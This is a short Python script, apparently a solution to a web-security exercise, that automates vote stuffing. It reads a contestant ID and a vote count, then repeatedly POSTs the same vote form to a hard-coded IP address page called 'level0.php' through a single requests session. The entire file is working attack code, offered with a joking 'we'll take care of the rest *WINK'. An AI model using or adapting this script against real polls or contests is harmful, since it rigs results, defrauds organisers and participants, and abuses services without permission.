#!/usr/bin/python3
import requests
print("This is an online Voting contest please provide your the ID of the contestor and how many times would you like to vote we'll take care of the rest *WINK ")
a = (input("who to vote for: "))
z = int(input("how any times kind sir?: "))
with requests.Session() as x:
	url = "http://158.69.76.135/level0.php"
	ID = a
	x.get(url)
	vote = dict(id=ID, holdthedoor="submit")
	i = 0
	while i < z:
		x.post(url, data=vote)
		i += 1
print("DONE!")
